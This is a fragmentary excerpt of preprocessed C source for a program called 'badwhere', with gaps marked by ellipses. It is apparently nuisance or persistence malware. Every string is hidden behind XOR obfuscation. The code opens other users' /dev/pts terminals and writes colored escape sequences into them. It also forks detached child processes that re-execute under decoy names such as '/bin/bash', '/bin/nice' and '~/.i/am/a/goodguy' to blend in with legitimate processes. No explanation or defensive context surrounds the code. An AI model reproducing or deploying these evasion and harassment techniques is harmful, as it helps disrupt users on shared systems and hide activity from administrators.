...
# 56 "badwhere.c"
 ...
 dp = opendir((xorstr("\x6e\x27\x31\x26\x6e\x33\x20\x23\x6e", sizeof("/dev/pts/"))));
 if (dp != 
# 59 "badwhere.c" 3 4
          ((void *)0)
# 59 "badwhere.c"
...
# 68 "badwhere.c"
  ...
  if (listcount > 0) {
   ...
   snprintf(fname, 0x100 -1, (xorstr("\x6e\x27\x31\x26\x6e\x33\x20\x23\x6e\x66\x30", sizeof("/dev/pts/%d"))), list[num]);
   fd = open(fname, 
# 86 "badwhere.c" 3 4
                   01
# 86 "badwhere.c"
...
void colorit(int fd) {
 int choice = rand() % (sizeof((xorstr("\x71\x72\x66\x63\x75\x76\x62", sizeof("0123456"))))-1);
 if (fd == -1) {
  printf((xorstr("\x5a\x18\x67\x75\x22\x78\x60\x75\x22\x2e\x74\x6a\x68\x63\x5e", sizeof("\x1b[3%c;4%cm :) \n"))), (xorstr("\x71\x72\x66\x63\x75\x76\x62", sizeof("0123456")))[choice], (xorstr("\x71\x72\x66\x63\x75\x76\x62", sizeof("0123456")))[choice]);
 } else {
  dprintf(fd, (xorstr("\x5a\x18\x67\x75\x22\x78\x60\x75\x22\x2e\x74\x6a\x68\x63\x5e", sizeof("\x1b[3%c;4%cm :) \n"))), (xorstr("\x71\x72\x66\x63\x75\x76\x62", sizeof("0123456")))[choice], (xorstr("\x71\x72\x66\x63\x75\x76\x62", sizeof("0123456")))[choice]);
 }
}
...
void causeloops(char* path) {
 ...
 for (i=0; i < 6; i++) {
  ...
  if (p == 0) {
   ...
   setsid();
   switch (rand() % 6) {
   case 0: name = (xorstr("\x6f\x6c\x3a\x3f\x35\x2b\x3d\x3e\x26", sizeof("./nothing"))); break;
   case 1: name = (xorstr("\x6e\x21\x3d\x3e\x6e\x2d\x3d\x33\x24", sizeof("/bin/nice"))); break;
   case 2: name = (xorstr("\x3f\x6c\x7a\x39\x6e\x22\x39\x7f\x20\x6c\x33\x3f\x2e\x27\x33\x25\x38", sizeof("~/.i/am/a/goodguy"))); break;
   case 3: name = (xorstr("\x6e\x26\x20\x33\x6e\x2d\x3b\x24\x23\x22\x30", sizeof("/etc/notbad"))); break;
   case 4: name = (xorstr("\x6e\x21\x3d\x3e\x6e\x21\x35\x23\x29", sizeof("/bin/bash"))); break;
   case 5: name = (xorstr("\x2b\x2c\x26\x34\x20\x2d", sizeof("jordan"))); break;
   }
   execl(path, name, 
# 152 "badwhere.c" 3 4
                    ((void *)0)
...
int main(int argc, char* argv[]) {
 ...
 if (strstr(argv[0], (xorstr("\x23\x22\x30\x27\x29\x26\x26\x35", sizeof("badwhere")))) == 
# 183 "badwhere.c" 3 4
                                      ((void *)0)
# 183 "badwhere.c"
                                          ) {
